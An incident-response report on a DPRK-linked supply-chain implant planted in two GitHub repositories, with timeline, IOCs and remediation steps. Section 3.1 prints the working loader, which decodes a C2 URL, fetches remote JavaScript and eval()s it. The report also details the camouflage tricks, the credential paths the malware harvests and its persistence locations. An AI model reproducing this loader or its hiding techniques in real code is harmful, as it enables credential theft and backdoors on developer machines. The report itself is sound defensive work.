# Incident Report — DPRK "PolinRider" Supply-Chain Implant in GitHub Repositories

**Classification:** Confidential — Incident Response
**Date of report:** 2026-08-25
**Severity:** Critical (malicious commits on default branches of two repositories; credential-theft malware with backdoor capability)
**Status:** Containment in progress (a second affected repository still carried the implant at time of writing; details withheld from the public copy — see internal IR record)

---

## 1. Executive Summary

Two GitHub repositories were compromised with an identical malicious implant, part of a publicly documented DPRK/Lazarus Group supply-chain campaign tracked as **PolinRider** (Contagious Interview / Famous Chollima cluster). The attacker force-pushed commits containing a staged JavaScript loader hidden inside legitimate-looking changes. When any developer or CI system runs `npm test` or a build that loads the infected config/source file, the loader fetches a remote payload and executes it via `eval()` — resulting in credential theft (SSH keys, cloud/npm tokens, browser data, crypto wallets) and potential deployment of the InvisibleFerret backdoor. The C2 endpoint used against the affected organization was taken offline by Vercel, but the campaign is active and rotates infrastructure.


| Repo                                          | Vector                                                                      | Malicious commit                            | Status                                                                                                            |
| --------------------------------------------- | --------------------------------------------------------------------------- | ------------------------------------------- | ----------------------------------------------------------------------------------------------------------------- |
| `the affected public repo` (public) | PR #1 "module federation fix" (merged to main)                              | `615257f` / `7f75527` (merged as `7091cbe`) | Implant on `main`; revert branch `0a0f58d` exists but is **incomplete** (left `jest.config.ts` + `.env` infected) |
| [private org repo — name withheld]            | Force-push to `master`, spoofed employee author, backdated ~13 months     | [withheld]                                  | Implant live on `master` at time of writing                                                                       |


---

## 2. Timeline (UTC)


| When                   | Event                                                                                                                                  |
| ---------------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| 2026-03-02 04:38–04:40 | PolinRider's documented 132-second mass-compromise burst across public GitHub (incl. Neutralinojs org) — campaign context              |
| 2026-03-06 / 03-08     | OpenSourceMalware (OSM) publishes initial attribution; 675+ repos / 352 owners infected                                                |
| 2026-03-31             | Malicious PR #1 merged into `the public repo` main (commits authored "Rizwan &lt;[expectp@gmail.com](mailto:expectp@gmail.com)&gt;") |
| \~2026-04-28           | TLS cert issued for C2 `auth-confirm-eight.vercel.app` (endpoint live from ≈ this date)                                                |
| 2026-05-30 10:55       | urlscan.io captures live C2 response (HTTP 200, 4,777-byte JS payload)                                                                 |
| 2026-06-15             | Vercel disables the C2 deployment (HTTP 451 `DEPLOYMENT_DISABLED`)                                                                     |
| 2026-07-13             | THOR/Nextron YARA `SUSP_OBFUSC_JS_Patterns_Jul26` flags the payload on VirusTotal (30/59 engines)                                      |
| 2026-08-24 06:31       | Force-push of malicious commit to the private org repo's `master` (details withheld)                                                   |
| 2026-08-24 22:12       | Incomplete revert pushed to `revert-1-module-federation-fix` on `the public repo`                                                    |
| 2026-08-25             | Incident declared; this investigation                                                                                                  |


| 2026-08-25 | Incident declared; this investigation |

---

## 3. Technical Analysis

### 3.1 The implant (identical in both repos)

```ts
import 'dotenv/config';
(async () => {
    const src = atob(process.env.AUTH_API_KEY);          // decodes C2 URL
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);                 // fetch payload
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);                                   // RCE
    } catch (err) {
      console.error('Auth Error!', err);                 // searchable log string
    }
})();
```

**Locations:**

- `the public repo`: `frontend/jest.config.ts` — executes on **every Jest test invocation** (plain Node context, no sandbox, full `process`/`fs`/`child_process` access)
- Private repo (name withheld): an Angular service source file under the hotfixes tree — executes when the TS source is compiled/imported in Node contexts

**Camouflage shipped with it:**

- `.env` added: `AUTH_API_KEY="aHR0cHM6Ly9hdXRoLWNvbmZpcm0tZWlnaHQudmVyY2VsLmFwcC9hcGk="` → base64 → `https://auth-confirm-eight.vercel.app/api`
- `.gitignore`: whole file rewritten with CRLF endings to bury the diff; `config.bat` and `node_modules` appended (documented attacker artifact pattern)
- Large innocuous diffs alongside (2,900-line `package-lock.json` churn; a real-looking Java security hotfix in `ContentResource.java` in `support`)
- Commit metadata spoofed/backdated (legit employee identity in `support`; throwaway "Rizwan" in the public repo)
- `dotenv` and `node-fetch` deliberately **not** added to `package.json` — both resolve as transitive deps, keeping the manifest clean

### 3.2 The payload (what the eval executes)

Hash/metadata (VT + urlscan):

- SHA-256 `a507b74b6b1e25444c586bc67ae0244cba3037f2b39f25f7eb507ded97c373c1`
- MD5 `7cdab8764ec1866a161b5fdaa2b8babe` — matches Vercel ETag `W/"7cdab876..."` from the urlscan capture (proves hash = decompressed body, same file)
- 4,777 bytes, single-line obfuscated JavaScript; VT tags `long-sleeps`, `javascript`; 30/60 engines malicious; filenames include `stage1-encoded.js`, `virus.js`, `payload.raw`

**Behavior (per OSM/Socket/THOR public analysis of the identical hash):**
1. Multi-layer string-shuffle deobfuscation (family signatures `("rmcej%otb%",2857687)`, `$1e42`, scrambled-constructor `wuqktamceigynzbosdctpusocrjhrflovnxrt`), self-eval in memory
2. **Blockchain dead-drop resolver**: reads immutable TRON/Aptos/BSC transactions to locate live C2 (untearable infrastructure)
3. Downloads + XOR-decrypts + eval's the final stage: **BeaverTail** infostealer/loader
4. BeaverTail harvests browser credentials/cookies, crypto wallets, `~/.ssh/*`, `~/.aws/credentials`, `~/.config/gcloud/*`, `**/.env`, system fingerprint; delivers **InvisibleFerret** backdoor (MITRE S1245) with per-OS persistence (LaunchAgents on macOS, `~/.config/autostart` on Linux, Run-key/Startup on Windows)
5. **Self-propagates**: scans local projects for config files (`postcss.config.mjs`, `jest.config.ts`, `vite.config.ts`, ...) and injects itself; force-pushes backdated commits to any repo the victim can push to — likely the mechanism by which the second the affected organization repo was infected

**Platform scope:** fully cross-platform. The stage that ran in our repos is pure Node JavaScript — Linux and macOS developers and CI runners are equally affected, not only Windows.

### 3.2a Addendum (2026-08-25, threat-intel briefing on the retrieved sample)

A later analysis of the payload sample (conducted outside the original session; strings below not independently re-verified by the IR team) adds:
- **Campaign build marker** `global.i = "A9-3727-2"` — matches the documented DPRK `A#-####-#` scheme (closest public IOC: `A9-0135-3`, Joyfill/StepSecurity, 2026-07-28). **Our exact marker is unpublished — treat as primary first-party IOC.**
- **obfuscator.io toolmarks**: `_0x` string-array + rotation (`while(!![])`) + exactly one `eval()`, fragmented URL strings
- **RPC dead-drop**: reads via public BSC/Eth RPC (`publicnode.com` et al.); the observed method `getBlockByNumber`/`eth_getBlockByNumber` is **not in any published DPRK IOC table** (documented methods: `eth_call`, `eth_getTransactionByHash`, recipient-address decoding) — possibly novel tradecraft; preserve the sample and report to GTIG/Netskope
- **Cluster naming**: same Contagious Interview family (a.k.a. Famous Chollima/DEV#POPPER/DeceptiveDevelopment/Tenacious Pungsan, MITRE G1052; EtherHiding arm tracked by GTIG as UNC5342); second stage may also be **OtterCookie** (Socket.IO RAT) in addition to BeaverTail/InvisibleFerret
- **Implication**: payloads are re-obfuscated between waves specifically to defeat exact-hash detection — the captured SHA-256 identifies *one* build; hunting must use structural patterns (see scanner §1c), not hashes
- **Related published IOCs** (from GTIG/StepSecurity/Sonatype/Ransom-ISAC reporting; for retro-hunt): attacker wallet `0xa322e5f3d311d3080e6f0121063e9adc2490ef1a`; JADESNOW BSC contract `0x8eac3198dd72f3e07108c4c7cff43108ad48a71c`; RPC hosts `bsc-rpc.publicnode.com`, `1rpc.io/eth`, `eth.drpc.org`; marker header `Sec-V:`; fingerprint string `helloipbot!!`; credential staging `/tmp/.npm` / `%USERPROFILE%\.npm`


### 3.3 Indicators of Compromise

**Network:**

- `auth-confirm-eight.vercel.app/api` (our endpoint; dead — HTTP 451)
- `auth-rho-dun.vercel.app/api`, `data-kappa.vercel.app/` (campaign siblings; the former served the identical payload hash)
- `api.trongrid.io`, Aptos public RPCs, `bsc-dataseed.binance.org` (blockchain dead-drop lookups)
- TRON: `TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP`, `TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG`
- Aptos: `0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e`, `0x3f0e5781d0855fb460661ac63257376db1941b2bb522499e4757ecb3ebd5dce3`

**Host/file:**

- Signature strings: `rmcej%otb%`, `wuqktamceigynzbosdctpusocrjhrflovnxrt`, `AUTH_API_KEY`
- Oversized (&gt;2.5 KB) config files; `config.bat` newly added to `.gitignore`
- macOS: `~/Library/LaunchAgents/com.avatar.update.wake.plist`; Linux: `~/.config/autostart/*.desktop` anomalies, `/tmp/app`
- VS Code `tasks.json` with `"runOn": "folderOpen"` executing odd files (e.g. `node _.woff2`)

**Git/CI:**

- "Auth Error!" console lines in test/build logs
- Force-pushed, backdated commits; audit-log `repo.push` anomalies; unexpected npm publishes

---

## 4. Verification Chain and Tooling (how each finding was confirmed)

Every claim in this report was verified with live queries during the investigation:

1. **Repository forensics — git/GitHub API**
  - `git clone` + `git show` on `the affected public repo` (public): implant in `frontend/jest.config.ts`, base64 C2 URL in `.env`, incomplete revert proven via `git show 0a0f58d:frontend/jest.config.ts`
  - Private org repo (name withheld): access obtained with a scoped classic PAT after diagnosing the 404 → 403 → missing-`repo`-scope progression; malicious commit retrieved via GitHub REST commits API when full clone timed out
2. **Payload decoding — coreutils**: `base64 -d` of `AUTH_API_KEY` → C2 URL
3. **Live endpoint probe — curl**: HTTP 451 + `x-vercel-error: DEPLOYMENT_DISABLED` → Vercel-side takedown confirmed
4. **urlscan.io API** (authenticated): located the only known live capture (scan `019e7885-c8df-711e-8712-23c5189aae89`, 2026-05-30): payload SHA-256/size/mime ("ASCII text, very long lines, no terminators"), Vercel ETag, brotli encoding; ML verdict 86/100 malicious
5. **VirusTotal API** (authenticated): hash present on VT; MD5↔ETag correlation; 30/60 detections; filenames (`stage1-encoded.js`); `long-sleeps` tag; community comments containing the Nextron THOR YARA match (Lazarus-linked obfuscation family) and the OSM blog reference. (Direct file download requires privileged VT access — payload bytes not retrieved)
6. **MalwareBazaar API** (authenticated): negative control — `hash_not_found`, showing the sample was unshared publicly and VT held the only public copy
7. **Public corroboration — web fetches**
  - OSM "Neutralinojs Compromised In DPRK Attack": full TTP match (identical `.gitignore`/`config.bat` artifact), and — decisive — lists **our exact payload SHA-256** as an official campaign IOC ("auth-rho-dun")
  - OSM "Hundreds of GitHub Repos Compromised By DPRK's PolinRider Campaign" + "Comprehensive Analysis of Contagious Interview": payload behavior chain and per-OS persistence IOCs
  - Socket ["PolinRider: North Korea-Linked Supply Chain Campaign Expands Across Open Source Ecosystems"](https://socket.dev/blog/polinrider-north-korea-linked-supply-chain-campaign-expands): campaign scope (162 malicious artifacts across npm/Packagist/Go/Chrome extensions), cross-ecosystem IOCs, defensive guidance — source of the `.woff2`/`node`-on-non-JS VS Code-task tradecraft now detected by scanner sections 1b2/4
  - GitHub API on `vercel-labs/agent-skills` PR #219 (name seen on VT): examined and ruled out as directly relevant (ordinary unmerged community PR; the filename was a researcher annotation)
8. **Detection tooling authored**: `/workspace/polinrider_scan.sh` — read-only Linux/macOS sweep: hard-IOC loader signatures (sec 1), content-classified oversized configs (1b), fake-font payload magic-byte check (1b2, from Socket's `.woff2` findings), informational family-pattern hunt (1c), stage-3 artifacts + `/tmp/.npm` staging (2), persistence (3), VS Code tasks incl. `node`-on-non-JS + content-checked git hooks (4), credential stores (5), DNS-cache check (6). Verdicts: COMPROMISED(1)/SUSPECT(2)/CLEAN(0) driven by hard IOCs only. Validated by `test_rg_detection.sh`, `test_config_classification.sh`, `test_reinfection_vectors.sh` (fixture suites) plus two rounds of live false-positive triage

**Attribution confidence: high** — three independent vendors (OSM, Socket, Nextron/THOR) + exact hash-level IOC match + identical TTP artifacts in our commits.
**Limitation:** payload bytes were never executed or fully retrieved by us; behavior analysis relies on cited public research of the identical hash. The C2 was server-side and may have served variable content per request.



---

## 5. Impact Assessment

- **Exposure window:** `the public repo` main infected since **2026-03-31**; `support` master since **2026-08-24**. Campaign C2s rotated over time — treat *any* execution of the implant as exposure regardless of date
- **Who is exposed:** any developer machine or CI runner that executed `npm test` / `nx test` / Jest / TS builds loading the infected files while a campaign C2 was reachable
- **Data at risk (if executed):** GitHub/npm/cloud credentials, SSH keys, `.env` secrets, browser sessions, crypto wallets; repos with push access (self-propagation); persistent backdoor
- **Cross-platform:** Linux and macOS developers equally at risk — not Windows-only

## 6. Containment &amp; Remediation

**Immediate (repo hygiene):**

1. Purge the implant from both repos: revert the malicious commit on the private repo's master (re-apply the legitimate Java hotfix cleanly); fully revert PR #1 on `the public repo` main (existing revert branch is incomplete — `jest.config.ts` and `.env` remain infected). Scan full git history for the IOC strings before declaring clean
2. Rotate credentials of any account that pushed to either repo; audit org **audit logs** (not commit history) for force pushes, new PATs, deploy keys, OAuth apps across all org repos
3. Enable branch protection (no force-push, required review) org-wide; sweep all repos for the IOC strings

**Host triage:**
4. Run `/workspace/polinrider_scan.sh` (incl. §1c structural pattern hunt) on every Linux/macOS dev machine and CI runner; correlate positives
5. Search proxy/DNS/firewall logs back to 2026-03 for IOC domains — the definitive "did it execute" signal (host DNS caches are short-lived)
6. **Block public blockchain-RPC egress** (`publicnode.com`, `1rpc.io`, `drpc.org`, `bsc-dataseed*`, Blockscout, trongrid, Aptos fullnodes) and alert on/block any **non-browser process** (node/npm/python/curl) making JSON-RPC POSTs to blockchain providers — for a non-Web3 org this is a near-zero-FP signal and severs the kill chain at the one chokepoint the attacker cannot avoid. Note: blocking the Vercel domains is hygiene, **not containment** — the on-chain pointer rotates for cents in gas
7. Confirmed execution on a host → isolate at network layer (do not power off — preserve memory/fileless artifacts); purge npm/yarn caches on all workstations and CI (compromised tarballs re-infect); rebuild container images built after first exposure; rotate **all** credentials from a clean machine (npm tokens, GitHub PATs/OAuth/Actions secrets, AWS/EKS/IRSA, SSH, browser creds+cookies — cookies survive password resets —, wallet keys); expect re-infection via VS Code tasks / git hooks / LaunchAgents unless cleaned (follow OSM "Getting Rid of PolinRider"); re-scan after cleanup
8. Stand up on-chain monitoring of attacker wallet `0xa322...ef1a` and JADESNOW contract `0x8eac...a71c` for early warning of C2 rotation; report the `A9-3727-2` marker and possible novel `getBlockByNumber` retrieval to GTIG/Netskope via a trusted vendor channel

**Third parties:**
7. Notify forks/consumers of both repos; `the public repo` is public — assume downstream clones exist
8. Report to GitHub Security / Vercel abuse (they acted on prior C2s); share IOCs with OSM campaign tracking

**Secrets hygiene (from this investigation):**
9. Rotate all credentials used during analysis (2× GitHub PATs; urlscan, MalwareBazaar, VirusTotal API keys) — they were transmitted in a support-channel chat

---

## 7. References

- OpenSourceMalware:
  - [Neutralinojs Compromised In DPRK Attack (2026-03-06)](https://opensourcemalware.com/blog/neutralinojs-compromised-in-dprk-attack)
  - [Hundreds of GitHub Repos Compromised By DPRK's PolinRider Campaign (2026-03-08)](https://opensourcemalware.com/blog/polinrider-dprk-compromised-hundreds-of-github-repos)
  - [A Comprehensive Analysis of DPRK's Contagious Interview (2026-01-20)](https://opensourcemalware.com/blog/contagious-interview-gets-an-upgrade-for-2026)
  - [A Developer's Guide to Getting Rid of PolinRider (2026-08-13)](https://opensourcemalware.com/blog/developer-guide-getting-over-polinrider)
- Socket: [PolinRider: North Korea-Linked Supply Chain Campaign Expands Across Open Source Ecosystems (2026-07-01)](https://socket.dev/blog/polinrider-north-korea-linked-supply-chain-campaign-expands) · [PolinRider IOC tracker](https://socket.dev/supply-chain-attacks/polinrider)
- Nextron/THOR YARA rule: [`SUSP_OBFUSC_JS_Patterns_Jul26`](https://valhalla.nextron-systems.com/info/rule/SUSP_OBFUSC_JS_Patterns_Jul26)
- MITRE ATT&CK: [S1245 InvisibleFerret](https://attack.mitre.org/software/S1245/) · [G1052 Contagious Interview](https://attack.mitre.org/groups/G1052/)
- VirusTotal file: [`a507b74b6b1e25444c586bc67ae0244cba3037f2b39f25f7eb507ded97c373c1`](https://www.virustotal.com/gui/file/a507b74b6b1e25444c586bc67ae0244cba3037f2b39f25f7eb507ded97c373c1/details)
- urlscan.io scan: [`019e7885-c8df-711e-8712-23c5189aae89`](https://urlscan.io/result/019e7885-c8df-711e-8712-23c5189aae89/)
- Incident artifacts: malicious commit [`the public repo@615257f`](https://github.com/the affected public repo/commit/615257f11c9d54dc41c630158aff99784b7cdb1f) (second affected repo is private; identifier withheld)

